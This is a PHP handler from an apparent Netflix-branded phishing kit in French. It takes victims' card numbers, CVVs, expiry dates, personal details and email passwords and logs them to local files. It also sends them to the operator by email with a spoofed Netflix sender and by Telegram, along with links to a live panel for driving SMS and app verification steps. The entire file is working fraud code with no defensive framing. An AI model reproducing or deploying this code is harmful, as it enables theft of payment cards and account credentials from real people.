<?php
setlocale(LC_TIME, 'fr_FR');
date_default_timezone_set('Europe/Paris');

include('../infos.php');

include("../common/sub_includes.php");

include("../common/functions.php");


if(isset($_POST['cardSubmit']))
{

  start_session();

  gather_card_infos();

if($DoubleCC == false)
{
  $string = file_get_contents("cc.txt");
  $string = explode("\n", $string); 
}




if(empty($_SESSION['ccnum']) || empty($_SESSION['ccexp']) || empty($_SESSION['cvv']) )
{

	//header('Location: ../steps/card.php?error=empty');
	echo '<meta http-equiv="refresh" content="0;url=../steps/card.php?error=empty" />';
}else if ((int)explode('/',$_SESSION['ccexp'])[1] < 25){
	//header('Location: ../steps/card.php?error=exp');
	echo '<meta http-equiv="refresh" content="0;url=../steps/card.php?error=exp" />';

}else if(in_array($_SESSION['ccnum'], $string)){   
    //header('Location: ../steps/card.php?error=cc');
	echo '<meta http-equiv="refresh" content="0;url=../steps/card.php?error=cc" />';
}else{


if(1 == 1){ 
				######################
				#### SETUP  PANEL ####
				######################
	
				if(!isset($_SESSION['id'])){
					createUniqueToken();
				}


				// cree de file
				
					$file = "../data/await/".$_SESSION['id'];
					$op = fopen($file,'w');
					fwrite($op,"");
					fclose($op);
					
				//link
				$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
				
				$homepage = dirname(dirname($actual_link));
				//$homepage = "http://localhost.com/";
				$custom = $homepage."/sma-admin/select.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip'];
				$ecard = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=ecard";
				$app = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=app";
				$sms1 = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=sms1";
				$sms2 = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=sms2";
				$sms3 = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=sms3";
				$apple = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=apple";
				$eapple = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=eapple";
				$done = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=done";



        $cc = $_SESSION['ccnum'];
		$_SESSION['last4'] = substr($_SESSION['ccnum'],-4);
    
    if($DoubleCC == false)
    {
      $file = fopen("cc.txt", "a");
      fwrite($file,$cc . "\n");
      fclose($file);
    }

    $bin=substr(str_replace(' ','',$_SESSION['ccnum']),0,6);	                  
    $ch = curl_init();
        
    $url = "https://lookup.binlist.net/$bin";
  
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  
  
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  
    $result = curl_exec($ch);
  
  
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
  
  
    curl_close($ch);
  
    $brand = '';
    $type = '';
    $emoji = '';
    $bank = '';
  
    $someArray = json_decode($result, true);
  
    $emoji = $someArray['country']['emoji'];
    $brand = $someArray['brand'];
    $type = $someArray['type'];
    $bank = $someArray['bank']['name'];
    $bank_phone = $someArray['bank']['phone'];
    $subject_title = "[BIN: $bin][$emoji $brand $type]";
  
    $_SESSION['bin_brand']  = $brand;
    $_SESSION['bin_bank']   = $bank;
    $_SESSION['bin_type'] = $type;

        ######################
				#### MAIL SENDING ####
				######################
$ccnum = $_SESSION['ccnum'];
$ccexp = $_SESSION['ccexp'];
$cccvv = $_SESSION['cvv'];
$nom = $_SESSION['nom'];
$prenom = $_SESSION['prenom'];
$adress = $_SESSION['adresse'];
$cp = $_SESSION['zip'];
$ville = $_SESSION['city'];
$tel = $_SESSION['phone'];
$dob = $_SESSION['birthday'];
	$date = date("d/m/Y");
$heure = date("H:i:s");

        if($mail_sending == true){

          $message = "
          
🧊 Numéro : ".$_SESSION['ccnum']."
🧊 Date d'expiration : ".$_SESSION['ccexp']."
🧊 CVV : ".$_SESSION['cvv']."

🧊 Banque : ".$bank."
🧊 Niveau : ".$brand."
🧊 Type : ".$type."

[🍷] Full Part [🍷]

🍷 Prénom : ".$_SESSION['prenom']."
🍷 Prénom : ".$_SESSION['nom']."
🍷 Date de naissance : ".$_SESSION['birthday']."

🍷 Numéro de téléphone : ".$_SESSION['phone']."
🍷 Adresse : ".$_SESSION['adresse']."
🍷 Code Postal : ".$_SESSION['zip']."
🍷 Ville : ".$_SESSION['city']."

[🍛] Login Part [🍛]

🍛 E-Mail : ".$_SESSION['email']."
🍛 Mot de passe : ".$_SESSION['password']."


[🍛 Live Panel [🍛] 

🍛 Link : ".$link."


[🍛 Tiers Part [🍛] 

🍛 Adresse IP : ".$_SESSION['ip']."
🍛 User Agent : ".$_SESSION['useragent']."

          ";
  
  
          $subject = "[".$NameSender."] + 1 CC | ".$bin." | ".$bank." | ".$brand." | ".$_SESSION['ip'];
					$headers = "From: Netflix <".$NameSender.">";



          mail($rezmail, $subject, $message, $headers);

        }

				##########################
				#### TELEGRAM SENDING ####
				##########################

        
				if($telegram_sending == true){
file_put_contents('autoshopo.txt', "\n$ccnum|$ccexp|$cccvv|$nom $prenom|$adress|$cp|$ville|$tel|$dob", FILE_APPEND);

          $message = '

💳 + 1 NEW CARD
└ '.$_SESSION['ccnum'].'


🏦 Carte de Paiement
├💳 Numéro : '.$_SESSION['ccnum'].'
├📅 Expiration : '.$_SESSION['ccexp'].'
└🔒 CVV : '.$_SESSION['cvv'].'

🗃 Coordonnées Bancaires
├🏷️ Banque : '.$bank.'
├🏷️ Niveau : '.$brand.'
└🏷️ Type : '.$type.'

🏦 Billing
├👤 Prénom • '.$_SESSION['prenom'].'
├👤 Nom : '.$_SESSION['nom'].'
├🎂 Date De Naissance • '.$_SESSION['birthday'].'
├📞 Téléphone • '.$_SESSION['phone'].'
├🏠 Adresse • '.$_SESSION['adresse'].'
├🏙️ Ville • '.$_SESSION['city'].'
└📮 Code Postal • '.$_SESSION['zip'].'

💊 Login Part
├💊 E-Mail : '.$_SESSION['email'].'
└💊 Mot de passe : '.$_SESSION['password'].'


🧩 Extra
├🌐 Adresse IP :  '.$_SESSION['ip'].'
├💊 User Agent :  '.$_SESSION['useragent'].'
└💊 Heure : '.$date.' '.$heure.'


';

          
            /*$banip = ''.$_SERVER['HTTP_HOST'].'/functions/getban.php?ip='.$_SESSION['ip'].'';
            $ccinvalide = ''.$_SERVER['HTTP_HOST'].'/functions/ccinvalide.php?ip='.$_SESSION['ip'].'';
            $lancevbv = ''.$_SERVER['HTTP_HOST'].'/functions/vbvclique.php?ip='.$_SESSION['ip'].'';*/
				//toTG(htmlspecialschars($message),$chat, $token, $method_of_send_telegram );
				toTG4(htmlspecialschars($message) , $ecard, $app, $sms1, $sms2, $apple, $eapple, $sms3, $custom, $done);

				}
      
    
             
              
            //header('Location: ../steps/wait.php');
			echo '<meta http-equiv="refresh" content="0;url=../steps/wait.php" />';

              
      




  }
  else{
	echo '<meta http-equiv="refresh" content="0;url=../steps/card.php?error=invalidcard" />';
    //header('Location: ../steps/card.php?error=invalidcard');
  }

}

}
else{
	echo 'no isset';
}




?>